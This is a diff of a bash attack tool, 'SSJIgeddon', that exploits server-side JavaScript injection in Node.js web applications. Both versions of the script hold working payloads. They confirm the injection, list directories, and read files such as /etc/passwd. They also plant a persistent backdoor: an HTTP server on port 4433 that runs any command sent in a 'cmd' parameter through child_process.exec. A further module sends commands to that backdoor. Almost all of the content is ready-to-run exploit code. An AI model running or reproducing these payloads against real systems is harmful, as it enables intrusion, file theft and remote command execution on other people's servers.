@@ -1,87 +1,165 @@
 #!/bin/bash
 
-if [[ $2 == "check" ]]; then
-	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
-	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
+declare -r RED="\e[91m"
+declare -r GREEN="\e[92m"
+declare -r YELLOW="\e[93m"
+declare -r BLUE="\e[94m"
+declare -r WHITE="\e[97m"
+declare -r END="\e[0m"
+
+declare -r VAR1='['
+declare -r VAR2=']'
+declare -r VAR3='i'
+declare -r VAR4='*'
+declare -r VAR5='>'
+declare -r VAR6='<'
+declare -r VAR7='-'
+declare -r VAR8='+'
+declare -r VAR9='target'
+declare -r VAR10='option'
+declare -r VAR11='resource'
+declare -r VAR12='Options:'
+declare -r VAR13='Usage:'
+declare -r VAR14='SSJIgeddon'
+declare -r VAR15='TARGET:'
+declare -r VAR16='PARAMETER:'
+declare -r VAR17='RESULT:'
+declare -r VAR18='VULNERABLE!'
+declare -r VAR19='NO VULNERABLE!'
+declare -r VAR20='FOUND!'
+declare -r VAR21='NO FOUND!'
+
+declare -r BOX1="$WHITE$VAR1$GREEN$VAR8$WHITE$VAR2$END"
+declare -r BOX2="$WHITE$VAR1$RED$VAR7$WHITE$VAR2$END"
+declare -r BOX3="$WHITE$VAR1$YELLOW$VAR3$WHITE$VAR2$END"
+declare -r BOX4="$WHITE$VAR1$BLUE$VAR4$WHITE$VAR2$END"
+
+function banner (){
+	echo -e "\n$GREEN _______ _______   _____ _______                 __     __            $END"
+	echo -e "$GREEN|     __|     __|_|     |_     _|.-----.-----.--|  |.--|  |.-----.-----.$END"
+  	echo -e "$GREEN|__     |__     |       |_|   |_ |  _  |  -__|  _  ||  _  ||  _  |     |$END"
+	echo -e "$GREEN|_______|_______|_______|_______||___  |_____|_____||_____||_____|__|__|$END"
+	echo -e "$WHITE-$RED================================$GREEN|_____|$RED===============================$WHITE-$END"
+}
+
+function help(){
+	echo -e "\n$BOX3 $RED$VAR13$END\t$GREEN$VAR14$END -t $RED$VAR6$WHITE$VAR9$RED$VAR5$END -o $RED$VAR6$WHITE$VAR10$RED$VAR5$END -r $RED$VAR6$WHITE$VAR11$RED$VAR5$END\n";
+	echo -e "$WHITE$VAR12$END";
+	echo -e "   $GREEN check$END      $WHITE Check if the host is vulnerable to this security flaw.$END";
+	echo -e "               $WHITE Validation via payload: <<res.end('text')>>.$END";
+	echo -e "   $GREEN dir$END        $WHITE List of files and directories.$END";
+	echo -e "               $WHITE As a resource you must indicate the path (example: /var/).$END";
+	echo -e "   $GREEN view$END       $WHITE View of file contents.";
+	echo -e "               $WHITE As a resource you must indicate the file you want to read (example: /etc/passwd).$END";
+	echo -e "   $GREEN backdoor$END   $WHITE Generates a backdoor in the target.$END";
+	echo -e "               $WHITE Through the same process (nodejs) an application is generated on port 4433.$END";
+	echo -e "   $GREEN cmd$END        $WHITE Using the previously generated backdoor, it allows you to execute commands on the system.$END";
+	echo -e "               $WHITE As a resource, be sure to indicate the command you want to execute.\n$END";
+}
+
+while getopts ":t:o:r:" arg; do
+	case $arg in
+    	t) TARGET=$OPTARG; let parameter_counter+=1 ;;
+    	o) OPTION=$OPTARG; let parameter_counter+=1 ;;
+		r) RESOURCE=$OPTARG; let parameter_counter+=1 ;;
+  	esac
+done
+
+function check_module(){
+	echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
+	echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
 	text="899d674da5e5299281ff3fbd2865f576"
 	payload=$(echo 'res.end(%22'$text'%22)')
-	target=$(echo $1 | sed "s/SSJI/$payload/g")
+	target=$(echo $TARGET | sed "s/SSJI/$payload/g")
 	result=$(curl -si $target)
 	if [[ $result == *$text ]]; then
-		echo -e "RESULT:\t\tVULNERABLE! :)\n"
+		echo -e "$BOX1 $WHITE$VAR17    $GREEN$VAR18\n\n"
 	else
-		echo -e "RESULT:\t\tNo vulnerable :(\n"
+		echo -e "$BOX2 $WHITE$VAR17    $RED$VAR19$END\n\n"
 	fi
+}
 
-elif [[ $2 == "dir" ]]; then
-	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
-	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
-	payload_dir=$(echo "res.send(require(\"fs\").readdirSync(\""$3"\").toString())")
-	url_cut_dir=$(echo $1 | sed "s/SSJI/\n/g")
+function dir_module(){
+	echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
+	echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
+	payload_dir=$(echo "res.send(require(\"fs\").readdirSync(\""$RESOURCE"\").toString())")
+	url_cut_dir=$(echo $TARGET | sed "s/SSJI/\n/g")
 	result_dir=$(curl -s $url_cut_dir$payload_dir)
-	echo -e "RESULT:"
 	if [[ $result_dir == *"Error:"* ]]; then
-	    echo -e "\nThe specified directory does not exist or access to it is not allowed.\n"
+	   	echo -e "$BOX2 $WHITE$VAR17    $RED$VAR21$END\n\n"
     else
-	    echo -e "\n$result_dir" | sed "s/,/\n/g"
-	    echo -e ""
+		echo -e "$BOX1 $WHITE$VAR17    $GREEN$VAR20$END"
+	   	echo -e "\n$result_dir" | sed "s/,/\n/g"
+	   	echo -e ""
     fi
+}
 
-elif [[ $2 == "view" ]]; then
-	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
-	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
-	payload_view=$(echo "res.end(require(\"fs\").readFileSync(\""$3"\"))")
-	url_cut_view=$(echo $1 | sed "s/SSJI/\n/g")
+function view_module(){
+	echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
+	echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
+	payload_view=$(echo "res.end(require(\"fs\").readFileSync(\""$RESOURCE"\"))")
+	url_cut_view=$(echo $TARGET | sed "s/SSJI/\n/g")
 	result_view=$(curl -s $url_cut_view$payload_view)
-	echo -e "RESULT:"
 	if [[ $result_view == *"Error:"* ]]; then
-	    echo -e "\nThe indicated file does not exist or access to it is not allowed.\n"
+		echo -e "$BOX2 $WHITE$VAR17    $RED$VAR21$END\n\n"
     else
-	    echo -e "\n$result_view"
-	    echo -e ""
+		echo -e "$BOX1 $WHITE$VAR17    $GREEN$VAR20$END"
+	   	echo -e "\n$result_view\n"
+	   	echo -e ""
     fi
+}
 
-elif [[ $2 == "backdoor" ]]; then
-	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
-	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
+function backdoor_module(){
+	echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
+	echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
 	payload_backdoor=$(echo "(function%20x()%7Brequire(%27http%27).createServer(function(req%2Cres)%7Bres.writeHead(200%2C%7B%22Content-Type%22%3A%22text%2Fplain%22%7D)%3Brequire(%27child_process%27).exec(require(%27url%27).parse(req.url%2Ctrue).query%5B%27cmd%27%5D%2Cfunction(e%2Cs%2Cst)%7Bres.end(s)%7D)%7D).listen(4433)%7D)()")
-	url_cut_backdoor=$(echo $1 | sed "s/SSJI/\n/g")
-	url_backdoor=$(echo $1 | cut -d "?" -f1 | cut -d ":" -f1-2)":4433/?cmd=pwd"
+	url_cut_backdoor=$(echo $TARGET | sed "s/SSJI/\n/g")
+	url_backdoor=$(echo $TARGET | cut -d "?" -f1 | cut -d ":" -f1-2)":4433/?cmd=pwd"
 	result_backdoor=$(curl -s $url_backdoor)
-	echo -e "RESULT:"
 	if [[ $result_backdoor == "" ]]; then
-	    curl -s $url_cut_backdoor$payload_backdoor >/dev/null
-	    echo -e "\nCongratulations! You have successfully generated a backdoor!\n"
+	   	curl -s $url_cut_backdoor$payload_backdoor >/dev/null
+	   	echo -e "$BOX1 $WHITE$VAR17$GREEN    Congratulations! You have successfully generated a backdoor!$END\n"
     else
-        echo -e "\nYou already have a previously generated backdoor. Please run the option \"cmd\" + 'command'.\n"
+       	echo -e "$BOX2 $WHITE$VAR17$RED    You already have a previously generated backdoor. Please run the option \"cmd\" + 'command'.\n"
     fi
+}
 
-elif [[ $2 == "cmd" ]]; then
-	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
-	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
-	url_cut_cmd=$(echo $1 | sed "s/SSJI/\n/g")
-	command=$(echo $3 | sed "s/ /\+/g")
-	url_cmd=$(echo $1 | cut -d "?" -f1 | cut -d ":" -f1-2)":4433/?cmd="$command
+function cmd_module(){
+	echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
+	echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
+	url_cut_cmd=$(echo $TARGET | sed "s/SSJI/\n/g")
+	command=$(echo $RESOURCE | sed "s/ /\+/g")
+	url_cmd=$(echo $TARGET | cut -d "?" -f1 | cut -d ":" -f1-2)":4433/?cmd="$command
 	result_cmd=$(curl -s $url_cmd)
-	echo -e "RESULT:"
 	if [[ $result_cmd == "" ]]; then
-	    echo -e "\nAn error has occurred. It was not possible to connect to the generated backdoor.\n"
+	    echo -e "$BOX2 $WHITE$VAR17    $RED$VAR21$END\n\n"
     else
+		echo -e "$BOX1 $WHITE$VAR17    $GREEN$VAR20$END"
 	    echo -e "\n$result_cmd"
 	    echo -e ""
     fi
+}
 
-elif [[ $2 == "" ]]; then
-	echo -e "\nUsage:\tbash ssjigeddon.sh TARGET [options] [resource]\n";
-	echo -e "Options:";
-	echo -e "      check      Check if the host is vulnerable to this security flaw.";
-	echo -e "                 Validation via payload: <<res.end('text')>>.";
-	echo -e "      dir        List of files and directories.";
-	echo -e "                 As a resource you must indicate the path (example: /var/).";
-	echo -e "      view       View of file contents.";
-	echo -e "                 As a resource you must indicate the file you want to read (example: /etc/passwd).";
-	echo -e "      backdoor   Generates a backdoor in the target.";
-	echo -e "                 Through the same process (nodejs) an application is generated on port 4433.";
-	echo -e "      cmd        Using the previously generated backdoor, it allows you to execute commands on the system.";
-	echo -e "                 As a resource, be sure to indicate the command you want to execute.\n";
-fi
+start() {
+    if [ "$OPTION" == "check" ]; then
+		banner
+    	check_module
+    elif [ "$OPTION" == "dir" ]; then
+		banner
+        dir_module
+    elif [ "$OPTION" == "view" ]; then
+		banner
+        view_module
+    elif [ "$OPTION" == "backdoor" ]; then
+		banner
+        backdoor_module
+	elif [ "$OPTION" == "cmd" ]; then
+		banner
+        cmd_module
+    else
+		banner
+        help
+    fi
+}
+
+start
